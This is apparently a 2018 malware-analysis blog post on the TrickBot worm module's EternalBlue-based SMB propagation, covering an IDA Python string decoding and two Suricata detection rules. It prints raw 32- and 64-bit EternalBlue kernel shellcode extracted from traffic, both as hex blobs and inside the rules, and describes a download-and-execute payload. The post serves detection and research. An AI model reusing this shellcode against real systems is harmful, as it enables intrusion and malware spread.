---
layout: post
title:  "TrickBot worming detection"
date:   2018-11-30 10:31:12 -0600
categories: malware
---


Finally got some time to look a little deeper at the TrickBot worm module, there's already been a number of posts out there in regards to this malware developing plugins related to network propagation[[1]] with it's worm module. As was shared by Brad (@malware_traffic)[[3]] in a PCAP this malware has been seen propagating over SMB, it was believed they were testing an SMB exploit but most of the PCAPs I've gone through show the worming happening over SMB with EternalBlue. Most of the shellcode being used is based on a POC on github[[4]], while mapping out the portions of shellcode I happened to stumble upon a recent blog post by somebody that does a pretty good of showing the flow[[5]].

Since most of my research echos the data in the blog post[5] I'll simply do a quick expand on detecting this activity. Using the shellcode from binary I had reversed along with a number of PCAPs thanks to (@malware_traffic and PacketTotal)[[3],[6],[7],[8],[9]]. 
Pulling out both the 32 bit and 64 bit versions of the shellcode prologue:

```
488b5424408b4a2c894a3855e830000000b9820000c00f324c8d0d360000004439c87419394500740a895504894500c645f8004991505a48c1ea200f305d31c0c3488d2d0010000048c1ed0c48c1e50c4883ed70c30f01f865488924251000000065488b2425a80100006a2b65ff342510000000505055e8c5ffffff488b45004883c01f48894424105152415041514152415331c0b201f00fb055f87514b9820000c08b45008b55040f30fbe80e000000fa415b415a415941585a595d58c341574156575653504c8b7d0049c1ef0c49c1e70c4981ef001000006641813f4d5a75f14c897d08654c8b342588010000bf787cf4dbe8c70000004891bf3f5f6477e8c20000008b400389c3488d50284c8d0c114d8b094c89c84c29f0483d0007000077ef4d29cebfe1140117e8970000008b780383c708488d3419e8d00000003de7c18c387409488b0c394829f9ebe7bf48b818b8e867000000488945f0488d1c11488b5b08488d4d104d31c04c8d0dad000000556a015541504a8d14334883ec20bfc45c196de835000000488d4d104d31c9bf3446ccafe8240000004883c44085c074bd488b452080781a01740948890048894008ebaa585b5e5f415e415fc3e802000000ffe0535156418b473c418b8407880000004c01f8508b48188b58204c01fbffc98b348b4c01fee81f00000039f875ef588b58244c01fb668b0c4b8b581c4c01fb8b048b4c01f85e595bc35231c099acc1ca0d01c285c075f6925ac3555357564157498b284c8b7d08525e4c89cb31c0440f22c048890289c148f7d14989c0b04050c1e006504989014883ec20bfea996e57e865ffffff4883c430488b3e488d353b000000b994080000f3a4488b45f0488b4018488b4020488b3048ad4c8b7820bf5e515e83e838ffffff48890331c9884df8b101440f22c1415f5e5f5b5dc3489231c951514989c94c8d050d00000089ca4883ec20ffd04883c430c3554889e54881eca0060000e8
```

```
8b4424208b481489481c60e8000000005be825000000b9760100000f328d7b3b39f87411394500740689450089550889f831d20f306131c0c224008dab00100000c1ed0cc1e50c83ed50c3b9230000006a300fa18ed98ec1648b0d400000008b6104519c60e8000000005be8cbffffff8b450083c0178944242431c09942f00fb055087512b976010000998b45000f30fbe804000000fa619dc38b4500c1e80cc1e00c2d001000006681384d5a75f4894504b8787cf4dbe8bc00000097b83f5f647757e8b000000029f889c18d581c8d341f64a1240100008b3689f229c281fa0004000077f252b8e1140117e88e0000008b400a8d50048d340fe8be0000003de7c18c3874078b3c1729d7ebea897d0c8d1c1f8d75105f8b5b04b83e4cf8cee85b0000008b400a29f8837c03f40074e731c0556a015550e800000000810424920000005053293c2456b8c45c196de82500000031c050505056b83446ccafe81500000085c074b08b451c80780e0174078900894004eba0c3e802000000ffe0608b6d04978b453c8b54057801ea8b4a188b5a2001eb498b348b01eee81d00000039f875f18b5a2401eb668b0c4b8b5a1c01eb8b048b01e88944241c61c35231c099acc1ca0d01c285c075f6925ac358894424105859585a6052518b2831c064
```

We can take a peak at a PCAP and see this data in there after the Trans2 response with invalid parameter.

![Trans2 invalid response]({{ site.url }}/assets/trickbotworm/shellcode_prologue.png "HTA to execute powershell")

We can even see the usage of the 'BAAD' string straight from the POC on github along with the URL for the worming.png file tacked on as well.

![Code blob]({{ site.url }}/assets/trickbotworm/shellcode_blob.png "Code blob")

As mentioned in the blog[[5]] after you get through the normal POC shellcode you get to some different shellcode that ends up being injected into services.exe.

The first thing this code does is decode out it's own string section by calling a function placed immediately after the string section.

![Services shellcode]({{ site.url }}/assets/trickbotworm/sservices_sc_decode.png "Services shellcode")

Decoding out the strings is pretty straightforward in IDA with python:
```
Python>data = GetManyBytes(0x405a23, 0x4c*4)
Python>data = bytearray(data)
Python>key = 0x7d2096c3
Python>out = ""
Python>import struct
Python>for i in range(0x4c):
Flushing buffers, please wait...ok
Python>  temp = struct.unpack_from('<I', data[i*4:])[0]
Python>  temp ^= key
Python>  out += struct.pack('<I', temp)
Python>
Python>out
winhttp.dll
Python>out.split('\x00')
['winhttp.dll', 'WinHttpOpen', 'WinHttpConnect', 'WinHttpOpenRequest', 'WinHttpQueryDataAvailable', 'WinHttpSendRequest', 'WinHttpReceiveResponse', 'WinHttpReadData', 'WinHttpCloseHandle', 'GetProcAddressA', 'LoadLibraryA', 'GetProcessHeap', 'HeapAlloc', 'HeapReAlloc', 'HeapFree', 'CreateFileA', 'WriteFile', 'CloseHandle', 'CreateProcessA', 'setup.exe', 'G', 'E', 'T', '', '', '', '']
```

So it looks like this code is simply to download and execute a URL which follows in line with the worming.png URL that was sent along in the PCAP data.

So how about detection then? Well I first wondered how static those prologue blobs are so I downloaded a bunch of PCAPs and wrote a generic suricata rule to scan for them.
```
alert tcp any any -> any 445 (msg:"TrickBot worm module shellcode"; content:"|48 8b 54 24 40 8b 4a 2c 89 4a 38 55 e8 30 00 00 00 b9 82 00 00 c0 0f 32 4c 8d 0d 36 00 00 00 44 39 c8 74 19 39 45 00 74 0a 89 55 04 89 45 00 c6 45 f8 00 49 91 50 5a 48 c1 ea 20 0f 30 5d 31 c0 c3 48 8d 2d 00 10 00 00 48 c1 ed 0c 48 c1 e5 0c 48 83 ed 70 c3 0f 01 f8 65 48 89 24 25 10 00 00 00 65 48 8b 24 25 a8 01 00 00 6a 2b 65 ff 34 25 10 00 00 00 50 50 55 e8 c5 ff ff ff 48 8b 45 00 48 83 c0 1f 48 89 44 24 10 51 52 41 50 41 51 41 52 41 53 31 c0 b2 01 f0 0f b0 55 f8 75 14 b9 82 00 00 c0 8b 45 00 8b 55 04 0f 30 fb e8 0e 00 00 00 fa 41 5b 41 5a 41 59 41 58 5a 59 5d 58 c3 41 57 41 56 57 56 53 50 4c 8b 7d 00 49 c1 ef 0c 49 c1 e7 0c 49 81 ef 00 10 00 00 66 41 81 3f 4d 5a 75 f1 4c 89 7d 08 65 4c 8b 34 25 88 01 00 00 bf 78 7c f4 db e8 c7 00 00 00 48 91 bf 3f 5f 64 77 e8 c2 00 00 00 8b 40 03 89 c3 48 8d 50 28 4c 8d 0c 11 4d 8b 09 4c 89 c8 4c 29 f0 48 3d 00 07 00 00 77 ef 4d 29 ce bf e1 14 01 17 e8 97 00 00 00 8b 78 03 83 c7 08 48 8d 34 19 e8 d0 00 00 00 3d e7 c1 8c 38 74 09 48 8b 0c 39 48 29 f9 eb e7 bf 48 b8 18 b8 e8 67 00 00 00 48 89 45 f0 48 8d 1c 11 48 8b 5b 08 48 8d 4d 10 4d 31 c0 4c 8d 0d ad 00 00 00 55 6a 01 55 41 50 4a 8d 14 33 48 83 ec 20 bf c4 5c 19 6d e8 35 00 00 00 48 8d 4d 10 4d 31 c9 bf 34 46 cc af e8 24 00 00 00 48 83 c4 40 85 c0 74 bd 48 8b 45 20 80 78 1a 01 74 09 48 89 00 48 89 40 08 eb aa 58 5b 5e 5f 41 5e 41 5f c3 e8 02 00 00 00 ff e0 53 51 56 41 8b 47 3c 41 8b 84 07 88 00 00 00 4c 01 f8 50 8b 48 18 8b 58 20 4c 01 fb ff c9 8b 34 8b 4c 01 fe e8 1f 00 00 00 39 f8 75 ef 58 8b 58 24 4c 01 fb 66 8b 0c 4b 8b 58 1c 4c 01 fb 8b 04 8b 4c 01 f8 5e 59 5b c3 52 31 c0 99 ac c1 ca 0d 01 c2 85 c0 75 f6 92 5a c3 55 53 57 56 41 57 49 8b 28 4c 8b 7d 08 52 5e 4c 89 cb 31 c0 44 0f 22 c0 48 89 02 89 c1 48 f7 d1 49 89 c0 b0 40 50 c1 e0 06 50 49 89 01 48 83 ec 20 bf ea 99 6e 57 e8 65 ff ff ff 48 83 c4 30 48 8b 3e 48 8d 35 3b 00 00 00 b9 94 08 00 00 f3 a4 48 8b 45 f0 48 8b 40 18 48 8b 40 20 48 8b 30 48 ad 4c 8b 78 20 bf 5e 51 5e 83 e8 38 ff ff ff 48 89 03 31 c9 88 4d f8 b1 01 44 0f 22 c1 41 5f 5e 5f 5b 5d c3 48 92 31 c9 51 51 49 89 c9 4c 8d 05 0d 00 00 00 89 ca 48 83 ec 20 ff d0 48 83 c4 30 c3 55 48 89 e5 48 81 ec a0 06 00 00 e8|"; flow:to_server, established; classtype:misc-activity; metadata:author JasonReaves; sid:9000060; rev:1;) 

alert tcp any any -> any 445 (msg:"TrickBot worm module shellcode 2"; content:"|8b 44 24 20 8b 48 14 89 48 1c 60 e8 00 00 00 00 5b e8 25 00 00 00 b9 76 01 00 00 0f 32 8d 7b 3b 39 f8 74 11 39 45 00 74 06 89 45 00 89 55 08 89 f8 31 d2 0f 30 61 31 c0 c2 24 00 8d ab 00 10 00 00 c1 ed 0c c1 e5 0c 83 ed 50 c3 b9 23 00 00 00 6a 30 0f a1 8e d9 8e c1 64 8b 0d 40 00 00 00 8b 61 04 51 9c 60 e8 00 00 00 00 5b e8 cb ff ff ff 8b 45 00 83 c0 17 89 44 24 24 31 c0 99 42 f0 0f b0 55 08 75 12 b9 76 01 00 00 99 8b 45 00 0f 30 fb e8 04 00 00 00 fa 61 9d c3 8b 45 00 c1 e8 0c c1 e0 0c 2d 00 10 00 00 66 81 38 4d 5a 75 f4 89 45 04 b8 78 7c f4 db e8 bc 00 00 00 97 b8 3f 5f 64 77 57 e8 b0 00 00 00 29 f8 89 c1 8d 58 1c 8d 34 1f 64 a1 24 01 00 00 8b 36 89 f2 29 c2 81 fa 00 04 00 00 77 f2 52 b8 e1 14 01 17 e8 8e 00 00 00 8b 40 0a 8d 50 04 8d 34 0f e8 be 00 00 00 3d e7 c1 8c 38 74 07 8b 3c 17 29 d7 eb ea 89 7d 0c 8d 1c 1f 8d 75 10 5f 8b 5b 04 b8 3e 4c f8 ce e8 5b 00 00 00 8b 40 0a 29 f8 83 7c 03 f4 00 74 e7 31 c0 55 6a 01 55 50 e8 00 00 00 00 81 04 24 92 00 00 00 50 53 29 3c 24 56 b8 c4 5c 19 6d e8 25 00 00 00 31 c0 50 50 50 56 b8 34 46 cc af e8 15 00 00 00 85 c0 74 b0 8b 45 1c 80 78 0e 01 74 07 89 00 89 40 04 eb a0 c3 e8 02 00 00 00 ff e0 60 8b 6d 04 97 8b 45 3c 8b 54 05 78 01 ea 8b 4a 18 8b 5a 20 01 eb 49 8b 34 8b 01 ee e8 1d 00 00 00 39 f8 75 f1 8b 5a 24 01 eb 66 8b 0c 4b 8b 5a 1c 01 eb 8b 04 8b 01 e8 89 44 24 1c 61 c3 52 31 c0 99 ac c1 ca 0d 01 c2 85 c0 75 f6 92 5a c3 58 89 44 24 10 58 59 58 5a 60 52 51 8b 28 31 c0 64|"; flow:to_server, established; classtype:misc-activity; metadata:author JasonReaves; sid:9000061; rev:1;) 
```

Turns out it's remained pretty static over time! Using suricata in PCAP mode I was able to verify detection of the packettotal PCAPs along with Brads PCAPs.

References:  
 1. https://www.flashpoint-intel.com/blog/new-version-trickbot-adds-worm-propagation-module/  
 2. https://www.vkremez.com/2017/12/lets-learn-introducing-new-trickbot.html  
 3. https://www.malware-traffic-analysis.net/2018/08/17/index.html  
 4. https://github.com/worawit/MS17-010/blob/master/shellcode/eternalblue_kshellcode_x86.asm  
 5. http://reversingminds-blog.logdown.com/posts/7803327-how-different-malware-families-uses-eternalblue-part-1  
 6. https://packettotal.com/app/analysis?id=1901ad7947dc6a40bd2b628cbdc7ceb3  
 7. https://packettotal.com/app/analysis?id=497bc1eafa83b9c482fd61345212c469  
 8. https://packettotal.com/app/analysis?id=96827e1669bef38f4948f4272c6803ae  
 9. https://www.malware-traffic-analysis.net/2018/11/09/index.html  
 
 
 


[1]:https://www.flashpoint-intel.com/blog/new-version-trickbot-adds-worm-propagation-module/  
[2]:https://www.vkremez.com/2017/12/lets-learn-introducing-new-trickbot.html  
[3]:https://www.malware-traffic-analysis.net/2018/08/17/index.html  
[4]:https://github.com/worawit/MS17-010/blob/master/shellcode/eternalblue_kshellcode_x86.asm  
[5]:http://reversingminds-blog.logdown.com/posts/7803327-how-different-malware-families-uses-eternalblue-part-1  
[6]:https://packettotal.com/app/analysis?id=1901ad7947dc6a40bd2b628cbdc7ceb3  
[7]:https://packettotal.com/app/analysis?id=497bc1eafa83b9c482fd61345212c469  
[8]:https://packettotal.com/app/analysis?id=96827e1669bef38f4948f4272c6803ae  
[9]:https://www.malware-traffic-analysis.net/2018/11/09/index.html  



